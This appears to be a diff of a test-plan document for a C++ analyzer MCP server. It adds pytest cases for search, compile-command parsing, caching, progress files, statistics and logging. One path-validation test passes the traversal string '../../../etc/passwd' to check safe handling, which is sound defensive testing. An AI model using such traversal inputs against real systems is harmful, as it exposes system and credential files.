@@ -4,6 +4,77 @@
 
 This document maps each requirement from REQUIREMENTS.md to specific test cases, organized by category. Each test case specifies what should be tested, expected outcomes, and test data needed.
 
+### Recent Enhancements
+
+The following test coverage has been added to ensure comprehensive validation of all MCP server functionality:
+
+**Section 4 - MCP Tool Tests:**
+- Added edge case tests for search_classes (empty patterns, Unicode, long patterns, special regex chars)
+- Added path validation tests for find_in_file (path traversal, special characters)
+
+**Section 5 - Compilation Configuration Tests:**
+- REQ-5.1: Added command string parsing test (shlex with quotes and spaces)
+- REQ-5.2: Added vcpkg auto-detection test (REQ-5.2.5)
+
+**Section 6 - Caching and Performance Tests:**
+- REQ-6.2: Added cache version mismatch invalidation test (REQ-6.2.5)
+- REQ-6.4: Added indexing progress file persistence test (REQ-6.4.6)
+- REQ-6.4: Added terminal detection for adaptive progress reporting (REQ-6.4.7)
+
+**Section 7 - Project Management Tests:**
+- REQ-7.3: Added platform-specific libclang path tests (macOS, Linux, Windows)
+- REQ-7.5: Added environment variable test for diagnostic level (CPP_ANALYZER_DIAGNOSTIC_LEVEL)
+
+**Section 5 - Compilation Configuration Tests:**
+- REQ-5.5: Added vcpkg integration tests (auto-detection, include paths)
+- REQ-5.6: Added Compile Commands Manager Extended APIs tests (6 new test functions)
+
+**Section 6 - Caching and Performance Tests:**
+- REQ-6.5: Added Progress Persistence tests (7 new test functions for save/load/status tracking)
+
+**Section 7 - Project Management Tests:**
+- REQ-7.5.5-7.5.6: Added DiagnosticLogger API tests (set_level, set_output_stream, configure_from_config)
+
+**Section 8 - Statistics and Monitoring Tests (NEW SECTION):**
+- REQ-8.1: Runtime Statistics APIs (3 test functions)
+- REQ-8.2: Call Graph Statistics (4 test functions for code quality analysis)
+- REQ-8.3: Cache Management APIs (4 test functions)
+
+**Section 8 - Test Fixtures (renumbered from Section 8):**
+- Enhanced test utilities with additional helper functions (env_var implementation, temp_dir, etc.)
+
+**Section 10 - Security, Robustness, and Edge Case Tests (NEW SECTION):**
+- **REQ-SEC-1**: Comprehensive security tests (5 P0-critical test functions)
+  - Path traversal attack prevention (9 attack vectors)
+  - Regex DoS prevention (catastrophic backtracking detection)
+  - Command injection prevention in compile_commands.json
+  - Symlink attack prevention
+  - Malicious configuration value validation
+- **REQ-ROB-1**: Data integrity and atomic operations (4 P0-critical test functions)
+  - Atomic cache write verification
+  - Malformed JSON cache recovery (4 corruption types)
+  - Cache consistency after interruption
+  - Concurrent cache write protection
+- **REQ-ERR-1**: Comprehensive error handling (6 P0-P1 test functions)
+  - File permission error handling
+  - Disk full scenario handling
+  - Corrupt compile_commands.json recovery (5 corruption types)
+  - Empty and whitespace-only file handling
+  - Null bytes in source files
+  - Extremely long symbol names (5000+ characters)
+- **REQ-EDGE-1**: Boundary conditions and edge cases (4 P1-P2 test functions)
+  - File size boundary testing (exact limit behavior)
+  - Maximum inheritance depth (100-level hierarchy)
+  - Many function overloads (50+ overloads)
+  - Concurrent file modification during parsing
+- **REQ-PLAT-1**: Platform-specific tests (3 P1 test functions)
+  - Unix file permission handling
+  - Windows path separator normalization
+  - Windows MAX_PATH (260 char) limit handling
+
+**Total New Tests in Section 10**: 22 test functions covering 90+ identified gaps
+**Priority Distribution**: 9 P0 (Critical), 8 P1 (High), 5 P2 (Medium)
+
 ## Table of Contents
 
 1. [Core Functional Requirements Tests (REQ-1.x)](#1-core-functional-requirements-tests)
@@ -13,7 +84,9 @@ This document maps each requirement from REQUIREMENTS.md to specific test cases,
 5. [Compilation Configuration Tests (REQ-5.x)](#5-compilation-configuration-tests)
 6. [Caching and Performance Tests (REQ-6.x)](#6-caching-and-performance-tests)
 7. [Project Management Tests (REQ-7.x)](#7-project-management-tests)
-8. [Test Fixtures Required](#8-test-fixtures-required)
+8. [Statistics and Monitoring Tests (REQ-8.x)](#8-statistics-and-monitoring-tests)
+9. [Test Fixtures Required](#9-test-fixtures-required)
+10. [Security, Robustness, and Edge Case Tests](#10-security-robustness-and-edge-case-tests-critical-gaps)
 
 ---
 
@@ -755,6 +828,27 @@ def test_search_classes_invalid_regex():
     results = analyzer.search_classes("[invalid(")
     assert isinstance(results, list)
     assert len(results) == 0  # Should return empty, not crash
+
+def test_search_classes_edge_cases():
+    """Test edge cases for pattern matching"""
+    analyzer = setup_test_analyzer()
+
+    # Empty pattern
+    results = analyzer.search_classes("")
+    assert isinstance(results, list)
+
+    # Unicode characters
+    results = analyzer.search_classes(".*класс.*")
+    assert isinstance(results, list)
+
+    # Very long pattern
+    long_pattern = "A" * 1000
+    results = analyzer.search_classes(long_pattern)
+    assert isinstance(results, list)
+
+    # Special regex characters
+    results = analyzer.search_classes(".*\\[.*\\].*")
+    assert isinstance(results, list)
 ```
 
 ### REQ-4.2: search_functions
@@ -908,6 +1002,18 @@ def test_find_in_file_absolute_path():
     results = analyzer.find_in_file(abs_path, ".*")
 
     assert len(results) > 0
+
+def test_find_in_file_path_validation():
+    """Test path traversal prevention and validation"""
+    analyzer = setup_test_analyzer()
+
+    # Path traversal attempts should be handled safely
+    results = analyzer.find_in_file("../../../etc/passwd", ".*")
+    assert isinstance(results, list)
+
+    # Special characters in filename
+    results = analyzer.find_in_file("file name with spaces.cpp", ".*")
+    assert isinstance(results, list)
 ```
 
 ### REQ-4.7: set_project_directory
@@ -1246,6 +1352,24 @@ def test_file_to_args_mapping():
         assert "-std=c++17" in args
         assert "-DTEST" in args
 
+def test_command_string_parsing():
+    """Test REQ-5.1.2: Parse command strings with shlex (quotes, spaces)"""
+    cc_data = [{
+        "directory": "/project",
+        "file": "/project/test.cpp",
+        "command": 'clang++ -I"/path with spaces" -DSTR="hello world" test.cpp'
+    }]
+
+    with temp_compile_commands(cc_data) as cc_path:
+        manager = CompileCommandsManager(cc_path.parent, {})
+
+        args = manager.get_compile_args(Path("/project/test.cpp"))
+
+        assert args is not None
+        # Should correctly parse quoted arguments with spaces
+        assert any('path with spaces' in arg for arg in args)
+        assert any('hello world' in arg for arg in args)
+
 def test_configurable_path():
     """Test REQ-5.1.6: Configurable compile_commands.json path"""
     with temp_dir() as project:
@@ -1302,6 +1426,19 @@ def test_disable_fallback():
     args = manager.get_compile_args_with_fallback(Path("nonexistent.cpp"))
 
     assert len(args) == 0  # No fallback
+
+def test_vcpkg_auto_detection():
+    """Test REQ-5.2.5: Automatic vcpkg include path detection"""
+    with temp_project() as project:
+        # Create vcpkg directory structure
+        vcpkg_dir = project / "vcpkg_installed" / "x64-windows" / "include"
+        vcpkg_dir.mkdir(parents=True)
+
+        manager = CompileCommandsManager(project, {})
+        args = manager.fallback_args
+
+        # Should automatically include vcpkg path
+        assert any("vcpkg_installed" in arg for arg in args)
 ```
 
 ### REQ-5.3: Compile Commands Caching
@@ -1381,6 +1518,185 @@ def test_custom_extensions():
     })
 
     assert ".cu" in manager.supported_extensions
+```
+
+### REQ-5.5: vcpkg Integration
+
+#### Test-5.5.1-3: vcpkg Auto-Detection
+- **Requirements**: REQ-5.5.1 through REQ-5.5.3
+- **Test File**: `tests/integration/test_vcpkg_integration.py`
+- **Test Cases**:
+
+```python
+def test_vcpkg_detection():
+    """Test REQ-5.5.1: Automatic vcpkg detection"""
+    with temp_project() as project:
+        # Create vcpkg directory structure
+        vcpkg_dir = project / "vcpkg_installed" / "x64-windows" / "include"
+        vcpkg_dir.mkdir(parents=True)
+
+        # Create another triplet
+        vcpkg_dir2 = project / "vcpkg_installed" / "x64-linux" / "include"
+        vcpkg_dir2.mkdir(parents=True)
+
+        analyzer = CppAnalyzer(project)
+
+        # Should detect vcpkg directory
+        assert any("vcpkg_installed" in path for path in analyzer.compile_commands_manager.fallback_args)
+
+def test_vcpkg_include_paths():
+    """Test REQ-5.5.2: vcpkg include paths added to fallback"""
+    with temp_project() as project:
+        vcpkg_dir = project / "vcpkg_installed" / "x64-windows" / "include"
+        vcpkg_dir.mkdir(parents=True)
+
+        analyzer = CppAnalyzer(project)
+        args = analyzer.compile_commands_manager.fallback_args
+
+        # Should include vcpkg paths for all found triplets
+        assert any("x64-windows/include" in arg for arg in args)
+
+def test_vcpkg_with_compile_commands():
+    """Test REQ-5.5.3: vcpkg paths added when compile_commands exists"""
+    with temp_project() as project:
+        # Create vcpkg directory
+        vcpkg_dir = project / "vcpkg_installed" / "x64-windows" / "include"
+        vcpkg_dir.mkdir(parents=True)
+
+        # Create minimal compile_commands.json
+        cc_path = project / "compile_commands.json"
+        cc_path.write_text('[{"directory": "/test", "file": "test.cpp", "command": "g++ test.cpp"}]')
+
+        analyzer = CppAnalyzer(project)
+
+        # vcpkg paths should still be in fallback args
+        assert any("vcpkg_installed" in arg for arg in analyzer.compile_commands_manager.fallback_args)
+
+def test_no_vcpkg_directory():
+    """Test graceful handling when no vcpkg directory exists"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+        args = analyzer.compile_commands_manager.fallback_args
+
+        # Should not have vcpkg paths
+        assert not any("vcpkg_installed" in arg for arg in args)
+        # But should still have other fallback args
+        assert "-std=c++17" in args
+```
+
+### REQ-5.6: Compile Commands Manager Extended APIs
+
+#### Test-5.6.1-6: Extended API Tests
+- **Requirements**: REQ-5.6.1 through REQ-5.6.6
+- **Test File**: `tests/unit/test_compile_commands_apis.py`
+- **Test Cases**:
+
+```python
+def test_get_stats_api():
+    """Test REQ-5.6.1: get_stats() API"""
+    with temp_compile_commands_file() as cc_path:
+        manager = CompileCommandsManager(cc_path.parent, {})
+        stats = manager.get_stats()
+
+        assert "enabled" in stats
+        assert "compile_commands_count" in stats
+        assert "file_mapping_count" in stats
+        assert "cache_enabled" in stats
+        assert "fallback_enabled" in stats
+        assert "last_modified" in stats
+        assert "compile_commands_path" in stats
+
+        assert stats["enabled"] == True
+        assert stats["compile_commands_count"] >= 0
+        assert stats["cache_enabled"] == True
+
+def test_is_file_supported():
+    """Test REQ-5.6.2: is_file_supported() API"""
+    cc_data = [{
+        "directory": "/project",
+        "file": "/project/test.cpp",
+        "command": "g++ test.cpp"
+    }]
+
+    with temp_compile_commands(cc_data) as cc_path:
+        manager = CompileCommandsManager(cc_path.parent, {})
+
+        # File in compile commands
+        assert manager.is_file_supported(Path("/project/test.cpp")) == True
+
+        # File not in compile commands
+        assert manager.is_file_supported(Path("/project/other.cpp")) == False
+
+def test_get_all_files():
+    """Test REQ-5.6.3: get_all_files() API"""
+    cc_data = [
+        {"directory": "/project", "file": "/project/a.cpp", "command": "g++ a.cpp"},
+        {"directory": "/project", "file": "/project/b.cpp", "command": "g++ b.cpp"}
+    ]
+
+    with temp_compile_commands(cc_data) as cc_path:
+        manager = CompileCommandsManager(cc_path.parent, {})
+        files = manager.get_all_files()
+
+        assert len(files) == 2
+        assert "/project/a.cpp" in files
+        assert "/project/b.cpp" in files
+
+def test_should_process_file():
+    """Test REQ-5.6.4: should_process_file() API"""
+    cc_data = [{
+        "directory": "/project",
+        "file": "/project/test.cpp",
+        "command": "g++ test.cpp"
+    }]
+
+    with temp_compile_commands(cc_data) as cc_path:
+        manager = CompileCommandsManager(cc_path.parent, {})
+
+        # File with compile commands
+        assert manager.should_process_file(Path("/project/test.cpp")) == True
+
+        # File without compile commands but supported extension
+        assert manager.should_process_file(Path("/project/other.cpp")) == True
+
+        # File with unsupported extension
+        assert manager.should_process_file(Path("/project/file.txt")) == False
+
+def test_is_extension_supported():
+    """Test REQ-5.6.5: is_extension_supported() API"""
+    manager = CompileCommandsManager(Path("/test"), {})
+
+    # Supported extensions
+    assert manager.is_extension_supported(Path("test.cpp")) == True
+    assert manager.is_extension_supported(Path("test.h")) == True
+    assert manager.is_extension_supported(Path("test.hpp")) == True
+
+    # Unsupported extensions
+    assert manager.is_extension_supported(Path("test.txt")) == False
+    assert manager.is_extension_supported(Path("test.py")) == False
+
+def test_clear_cache_api():
+    """Test REQ-5.6.6: clear_cache() API"""
+    cc_data = [{
+        "directory": "/project",
+        "file": "/project/test.cpp",
+        "command": "g++ test.cpp"
+    }]
+
+    with temp_compile_commands(cc_data) as cc_path:
+        manager = CompileCommandsManager(cc_path.parent, {})
+
+        # Verify cache is populated
+        assert len(manager.compile_commands) > 0
+        assert manager.last_modified > 0
+
+        # Clear cache
+        manager.clear_cache()
+
+        # Verify cache is cleared
+        assert len(manager.compile_commands) == 0
+        assert len(manager.file_to_command_map) == 0
+        assert manager.last_modified == 0
 ```
 
 ---
@@ -1516,6 +1832,30 @@ def test_invalidate_on_dependencies_change():
         analyzer2 = CppAnalyzer(project)
         # Try to load cache with include_dependencies=False
         # Should invalidate
+
+def test_invalidate_on_cache_version_mismatch():
+    """Test REQ-6.2.5: Cache version mismatch invalidation"""
+    with temp_project() as project:
+        analyzer1 = CppAnalyzer(project)
+        analyzer1.index_project()
+
+        # Manually change cache version to simulate old cache
+        cache_file = analyzer1.cache_manager.cache_dir / "cache_info.json"
+        with open(cache_file, 'r+') as f:
+            data = json.load(f)
+            data['version'] = '1.0'  # Old version
+            f.seek(0)
+            json.dump(data, f)
+            f.truncate()
+
+        # Should invalidate cache due to version mismatch
+        analyzer2 = CppAnalyzer(project)
+        cache_loaded = analyzer2._load_cache()
+
+        assert cache_loaded == False
+        # Should successfully re-index
+        count = analyzer2.index_project()
+        assert count > 0
 ```
 
 ### REQ-6.3: Cache Loading
@@ -1626,6 +1966,178 @@ def test_progress_reporting(capsys):
         # Should see progress info
         assert "files/sec" in captured.err
         assert "Progress:" in captured.err or "Indexing complete" in captured.err
+
+def test_progress_file_persistence():
+    """Test REQ-6.4.6: Indexing progress file creation and tracking"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        # Find progress file in cache directory
+        cache_dir = project / ".mcp_cache"
+        progress_files = list(cache_dir.glob("*/indexing_progress.json"))
+
+        assert len(progress_files) >= 1
+        progress_file = progress_files[0]
+
+        # Verify file contains expected fields
+        with open(progress_file) as f:
+            progress = json.load(f)
+
+        assert "total_files" in progress
+        assert "indexed_files" in progress
+        assert "failed_files" in progress
+        assert "cache_hits" in progress
+        assert "status" in progress
+        assert progress["total_files"] > 0
+
+def test_terminal_detection_for_progress():
+    """Test REQ-6.4.7: Adaptive progress reporting based on terminal detection"""
+    with temp_project(num_files=10) as project:
+        # Mock terminal detection (isatty = True)
+        with mock.patch('sys.stderr.isatty', return_value=True):
+            analyzer = CppAnalyzer(project)
+            # Should report more frequently for terminal
+            # (Implementation detail: check reporting frequency)
+
+        # Mock MCP session (non-terminal)
+        with env_var("MCP_SESSION_ID", "test_session_123"):
+            analyzer2 = CppAnalyzer(project)
+            # Should report less frequently for non-terminal
+            # (Implementation detail: check reporting frequency)
+```
+
+### REQ-6.5: Progress Persistence
+
+#### Test-6.5.1-5: Progress File Management
+- **Requirements**: REQ-6.5.1 through REQ-6.5.5
+- **Test File**: `tests/integration/test_progress_persistence.py`
+- **Test Cases**:
+
+```python
+def test_progress_file_creation():
+    """Test REQ-6.5.1: Progress file is created in cache directory"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        # Find progress file
+        progress_file = analyzer.cache_manager.cache_dir / "indexing_progress.json"
+        assert progress_file.exists()
+
+def test_progress_file_content():
+    """Test REQ-6.5.2: Progress file contains all required fields"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        progress_file = analyzer.cache_manager.cache_dir / "indexing_progress.json"
+        with open(progress_file) as f:
+            progress = json.load(f)
+
+        # Verify all required fields
+        assert "project_root" in progress
+        assert "total_files" in progress
+        assert "indexed_files" in progress
+        assert "failed_files" in progress
+        assert "cache_hits" in progress
+        assert "last_index_time" in progress
+        assert "timestamp" in progress
+        assert "class_count" in progress
+        assert "function_count" in progress
+        assert "status" in progress
+
+        # Verify types and values
+        assert isinstance(progress["total_files"], int)
+        assert isinstance(progress["indexed_files"], int)
+        assert isinstance(progress["last_index_time"], (int, float))
+        assert progress["status"] in ["in_progress", "complete", "interrupted"]
+
+def test_progress_status_complete():
+    """Test REQ-6.5.3: Status set to 'complete' on successful indexing"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        progress = analyzer.cache_manager.load_progress()
+
+        assert progress is not None
+        assert progress["status"] == "complete"
+        assert progress["indexed_files"] == progress["total_files"]
+
+def test_progress_status_interrupted():
+    """Test REQ-6.5.5: Status set to 'interrupted' on failure"""
+    with temp_project() as project:
+        # Create a file that will cause parsing to fail
+        bad_file = project / "bad.cpp"
+        bad_file.write_text("intentionally broken syntax {{{")
+
+        analyzer = CppAnalyzer(project)
+
+        # Mock indexing to simulate interruption
+        try:
+            # Simulate interrupted indexing
+            analyzer.cache_manager.save_progress(
+                total_files=10,
+                indexed_files=5,
+                failed_files=1,
+                cache_hits=0,
+                last_index_time=1.5,
+                class_count=10,
+                function_count=20,
+                status="interrupted"
+            )
+        except:
+            pass
+
+        progress = analyzer.cache_manager.load_progress()
+        assert progress["status"] == "interrupted"
+        assert progress["indexed_files"] < progress["total_files"]
+
+def test_load_progress_api():
+    """Test REQ-6.5.4: load_progress() API"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        # Load progress using API
+        progress = analyzer.cache_manager.load_progress()
+
+        assert progress is not None
+        assert "project_root" in progress
+        assert progress["status"] == "complete"
+
+def test_progress_persistence_across_sessions():
+    """Test progress is persisted and can be loaded in new session"""
+    with temp_project() as project:
+        # First session: Index and save progress
+        analyzer1 = CppAnalyzer(project)
+        analyzer1.index_project()
+
+        progress1 = analyzer1.cache_manager.load_progress()
+        original_timestamp = progress1["timestamp"]
+
+        # Second session: Load progress
+        analyzer2 = CppAnalyzer(project)
+        progress2 = analyzer2.cache_manager.load_progress()
+
+        # Should load same progress
+        assert progress2 is not None
+        assert progress2["timestamp"] == original_timestamp
+        assert progress2["status"] == "complete"
+
+def test_progress_update_during_indexing():
+    """Test REQ-6.5.3: Progress saved periodically during indexing"""
+    with temp_project(num_files=50) as project:
+        analyzer = CppAnalyzer(project)
+
+        # Start indexing (in background if possible)
+        analyzer.index_project()
+
+        # Progress should be saved
+        progress = analyzer.cache_manager.load_progress()
+        assert progress is not None
+        assert progress["status"] == "complete"
 ```
 
 ---
@@ -1800,6 +2312,44 @@ def test_platform_library_names():
         # Should look for .so
         pass
 
+@pytest.mark.skipif(sys.platform != "darwin", reason="macOS-specific")
+def test_macos_libclang_paths():
+    """Test REQ-7.3.2: macOS-specific libclang search paths"""
+    from mcp_server.cpp_mcp_server import find_and_configure_libclang
+
+    # Should check in order:
+    # 1. Bundled lib/macos/
+    # 2. /usr/local/lib
+    # 3. /opt/homebrew/lib
+    # 4. Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib
+    # 5. llvm-config paths
+    # Verify search logic covers these paths
+
+@pytest.mark.skipif(sys.platform != "linux", reason="Linux-specific")
+def test_linux_libclang_paths():
+    """Test REQ-7.3.2: Linux-specific libclang search paths"""
+    from mcp_server.cpp_mcp_server import find_and_configure_libclang
+
+    # Should check in order:
+    # 1. Bundled lib/linux/
+    # 2. /usr/lib/llvm-*
+    # 3. /usr/lib/x86_64-linux-gnu/
+    # 4. llvm-config paths
+    # Verify search logic covers these paths
+
+@pytest.mark.skipif(sys.platform != "win32", reason="Windows-specific")
+def test_windows_libclang_paths():
+    """Test REQ-7.3.2: Windows-specific libclang search paths"""
+    from mcp_server.cpp_mcp_server import find_and_configure_libclang
+
+    # Should check in order:
+    # 1. Bundled lib/windows/
+    # 2. Program Files LLVM
+    # 3. vcpkg installed
+    # 4. Anaconda/conda environments
+    # 5. llvm-config paths
+    # Verify search logic covers these paths
+
 def test_library_reporting():
     """Test REQ-7.3.3: Report which library used"""
     # Verify diagnostic message is output
@@ -1899,13 +2449,21 @@ def test_diagnostics_to_stderr():
     assert diagnostics.logger.output_stream == sys.stderr
 
 def test_configurable_level():
-    """Test REQ-7.5.3: Configurable level"""
+    """Test REQ-7.5.3: Configurable level via config file"""
     with temp_project() as project:
         config_file = project / ".cpp-analyzer-config.json"
         config_file.write_text('{"diagnostics": {"level": "error"}}')
 
         config = CppAnalyzerConfig(project)
         # Verify level is set
+        # (Implementation-dependent)
+
+def test_diagnostic_level_from_env():
+    """Test REQ-7.5.3: Configurable level via environment variable"""
+    with env_var("CPP_ANALYZER_DIAGNOSTIC_LEVEL", "ERROR"):
+        from mcp_server import diagnostics
+        # Verify diagnostic level is set to ERROR
+        # Environment variable should override default settings
         # (Implementation-dependent)
 
 def test_enable_disable():
@@ -1917,13 +2475,355 @@ def test_enable_disable():
 
     diagnostics.logger.set_enabled(True)
     # Verify output resumes
+
+def test_diagnostic_logger_set_level():
+    """Test REQ-7.5.5: DiagnosticLogger.set_level() API"""
+    from mcp_server.diagnostics import DiagnosticLogger, DiagnosticLevel
+
+    logger = DiagnosticLogger()
+
+    # Change level
+    logger.set_level(DiagnosticLevel.ERROR)
+
+    # Messages below ERROR should not output
+    # (Testing this requires capturing output)
+
+def test_diagnostic_logger_set_output_stream():
+    """Test REQ-7.5.5: DiagnosticLogger.set_output_stream() API"""
+    from mcp_server.diagnostics import DiagnosticLogger
+    import io
+
+    logger = DiagnosticLogger()
+
+    # Redirect to custom stream
+    custom_stream = io.StringIO()
+    logger.set_output_stream(custom_stream)
+
+    logger.info("Test message")
+
+    # Verify message went to custom stream
+    assert "Test message" in custom_stream.getvalue()
+
+def test_diagnostic_logger_level_methods():
+    """Test REQ-7.5.5: Level-specific logging methods"""
+    from mcp_server.diagnostics import DiagnosticLogger
+    import io
+
+    logger = DiagnosticLogger()
+    stream = io.StringIO()
+    logger.set_output_stream(stream)
+
+    # Test all level methods
+    logger.debug("Debug message")
+    logger.info("Info message")
+    logger.warning("Warning message")
+    logger.error("Error message")
+    logger.fatal("Fatal message")
+
+    output = stream.getvalue()
+    assert "Debug message" in output
+    assert "Info message" in output
+    assert "Warning message" in output
+    assert "Error message" in output
+    assert "Fatal message" in output
+
+def test_configure_from_config():
+    """Test REQ-7.5.6: configure_from_config() function"""
+    from mcp_server.diagnostics import configure_from_config
+
+    config = {
+        "diagnostics": {
+            "level": "error",
+            "enabled": True
+        }
+    }
+
+    configure_from_config(config)
+
+    # Verify configuration was applied
+    # (Implementation-dependent verification)
 ```
 
 ---
 
-## 8. Test Fixtures Required
+## 8. Statistics and Monitoring Tests
 
-### 8.1 Minimal Fixtures (Unit Tests)
+### REQ-8.1: Runtime Statistics APIs
+
+#### Test-8.1.1-3: CppAnalyzer Statistics
+- **Requirements**: REQ-8.1.1 through REQ-8.1.3
+- **Test File**: `tests/unit/test_runtime_statistics.py`
+- **Test Cases**:
+
+```python
+def test_get_stats_api():
+    """Test REQ-8.1.1: CppAnalyzer.get_stats() API"""
+    analyzer = setup_test_analyzer()
+
+    stats = analyzer.get_stats()
+
+    # Verify required fields
+    assert "class_count" in stats
+    assert "function_count" in stats
+    assert "file_count" in stats
+
+    # Verify types
+    assert isinstance(stats["class_count"], int)
+    assert isinstance(stats["function_count"], int)
+    assert isinstance(stats["file_count"], int)
+
+    # If compile commands enabled, should have additional fields
+    if analyzer.compile_commands_manager.enabled:
+        assert "compile_commands_enabled" in stats
+        assert "compile_commands_count" in stats
+        assert "compile_commands_file_mapping_count" in stats
+
+def test_get_compile_commands_stats():
+    """Test REQ-8.1.2: CppAnalyzer.get_compile_commands_stats() API"""
+    with temp_project_with_cc() as project:
+        analyzer = CppAnalyzer(project)
+
+        stats = analyzer.get_compile_commands_stats()
+
+        assert "enabled" in stats
+        if stats["enabled"]:
+            assert "compile_commands_count" in stats
+            assert "file_mapping_count" in stats
+            assert "cache_enabled" in stats
+
+def test_stats_thread_safety():
+    """Test REQ-8.1.3: Statistics APIs are thread-safe"""
+    analyzer = setup_test_analyzer()
+
+    # Call get_stats from multiple threads simultaneously
+    import threading
+
+    results = []
+
+    def get_stats_threaded():
+        stats = analyzer.get_stats()
+        results.append(stats)
+
+    threads = [threading.Thread(target=get_stats_threaded) for _ in range(10)]
+
+    for t in threads:
+        t.start()
+
+    for t in threads:
+        t.join()
+
+    # All threads should have completed without errors
+    assert len(results) == 10
+
+    # Results should be consistent
+    first_result = results[0]
+    for result in results:
+        assert result["class_count"] == first_result["class_count"]
+        assert result["function_count"] == first_result["function_count"]
+```
+
+### REQ-8.2: Call Graph Statistics
+
+#### Test-8.2.1-2: Call Graph Metrics
+- **Requirements**: REQ-8.2.1 through REQ-8.2.2
+- **Test File**: `tests/unit/test_call_graph_statistics.py`
+- **Test Cases**:
+
+```python
+def test_call_graph_statistics_api():
+    """Test REQ-8.2.1: CallGraphAnalyzer.get_call_statistics() API"""
+    with temp_project() as project:
+        # Create files with call relationships
+        file1 = project / "caller.cpp"
+        file1.write_text("""
+            void callee1() {}
+            void callee2() {}
+            void caller() {
+                callee1();
+                callee2();
+                callee1();  // Called twice
+            }
+        """)
+
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        stats = analyzer.call_graph_analyzer.get_call_statistics()
+
+        # Verify required fields
+        assert "total_functions_with_calls" in stats
+        assert "total_functions_being_called" in stats
+        assert "total_unique_calls" in stats
+        assert "most_called_functions" in stats
+        assert "functions_with_most_calls" in stats
+
+        # Verify types
+        assert isinstance(stats["total_functions_with_calls"], int)
+        assert isinstance(stats["total_functions_being_called"], int)
+        assert isinstance(stats["total_unique_calls"], int)
+        assert isinstance(stats["most_called_functions"], list)
+        assert isinstance(stats["functions_with_most_calls"], list)
+
+        # Verify list structure
+        if len(stats["most_called_functions"]) > 0:
+            # Each entry should be (USR, count) tuple
+            entry = stats["most_called_functions"][0]
+            assert isinstance(entry, (list, tuple))
+            assert len(entry) == 2
+            assert isinstance(entry[1], int)  # call count
+
+def test_most_called_functions():
+    """Test REQ-8.2.2: Identify most called functions"""
+    with temp_project() as project:
+        file1 = project / "test.cpp"
+        file1.write_text("""
+            void veryPopular() {}
+            void caller1() { veryPopular(); }
+            void caller2() { veryPopular(); }
+            void caller3() { veryPopular(); }
+        """)
+
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        stats = analyzer.call_graph_analyzer.get_call_statistics()
+
+        # veryPopular should be in most_called_functions
+        most_called = stats["most_called_functions"]
+        assert len(most_called) > 0
+
+        # Should be sorted by call count (descending)
+        if len(most_called) > 1:
+            assert most_called[0][1] >= most_called[1][1]
+
+def test_functions_with_most_calls():
+    """Test REQ-8.2.2: Identify complex functions making many calls"""
+    with temp_project() as project:
+        file1 = project / "test.cpp"
+        file1.write_text("""
+            void helper1() {}
+            void helper2() {}
+            void helper3() {}
+            void complexFunction() {
+                helper1();
+                helper2();
+                helper3();
+            }
+        """)
+
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        stats = analyzer.call_graph_analyzer.get_call_statistics()
+
+        # complexFunction should be in functions_with_most_calls
+        most_calls = stats["functions_with_most_calls"]
+        assert len(most_calls) > 0
+
+        # Should be sorted by call count (descending)
+        if len(most_calls) > 1:
+            assert most_calls[0][1] >= most_calls[1][1]
+
+def test_dead_code_detection():
+    """Test REQ-8.2.2: Detect potential dead code (never called)"""
+    with temp_project() as project:
+        file1 = project / "test.cpp"
+        file1.write_text("""
+            void neverCalled() {}
+            void caller() { /* doesn't call neverCalled */ }
+        """)
+
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        stats = analyzer.call_graph_analyzer.get_call_statistics()
+
+        # Total functions indexed should include neverCalled
+        # But it won't appear in most_called_functions list
+        all_functions = len(analyzer.function_index)
+        called_functions = stats["total_functions_being_called"]
+
+        # Some functions may be never called (potential dead code)
+        # This is useful for code quality analysis
+```
+
+### REQ-8.3: Cache Management APIs
+
+#### Test-8.3.1-3: Cache Management
+- **Requirements**: REQ-8.3.1 through REQ-8.3.3
+- **Test File**: `tests/unit/test_cache_management_apis.py`
+- **Test Cases**:
+
+```python
+def test_remove_file_cache():
+    """Test REQ-8.3.1: CacheManager.remove_file_cache() API"""
+    with temp_project() as project:
+        test_file = project / "test.cpp"
+        test_file.write_text("class Test {};")
+
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        # Verify cache file exists
+        cache_path = analyzer.cache_manager.get_file_cache_path(str(test_file))
+        assert cache_path.exists()
+
+        # Remove cache
+        result = analyzer.cache_manager.remove_file_cache(str(test_file))
+
+        # Verify removal
+        assert result == True
+        assert not cache_path.exists()
+
+def test_get_file_cache_path():
+    """Test REQ-8.3.2: CacheManager.get_file_cache_path() API"""
+    with temp_project() as project:
+        test_file = project / "test.cpp"
+
+        analyzer = CppAnalyzer(project)
+
+        cache_path = analyzer.cache_manager.get_file_cache_path(str(test_file))
+
+        # Should return Path object
+        assert isinstance(cache_path, Path)
+
+        # Should be in files/ subdirectory
+        assert "files" in str(cache_path)
+
+        # Should end with .json
+        assert cache_path.suffix == ".json"
+
+def test_cache_api_error_handling():
+    """Test REQ-8.3.3: Cache APIs return success/failure status"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+
+        # Try to remove cache for non-existent file
+        result = analyzer.cache_manager.remove_file_cache("/nonexistent/file.cpp")
+
+        # Should return False (not raise exception)
+        assert result == False
+
+def test_cache_path_consistency():
+    """Test cache path generation is consistent"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+
+        file_path = "/project/test.cpp"
+
+        # Get path twice
+        path1 = analyzer.cache_manager.get_file_cache_path(file_path)
+        path2 = analyzer.cache_manager.get_file_cache_path(file_path)
+
+        # Should be identical
+        assert path1 == path2
+```
+
+---
+
+## 9. Test Fixtures Required
+
+### 9.1 Minimal Fixtures (Unit Tests)
 
 ```
 tests/fixtures/
@@ -1987,7 +2887,7 @@ tests/fixtures/
     └── multi_symbol_file.h         # Multiple classes/functions in one file
 ```
 
-### 8.2 Integration Fixtures
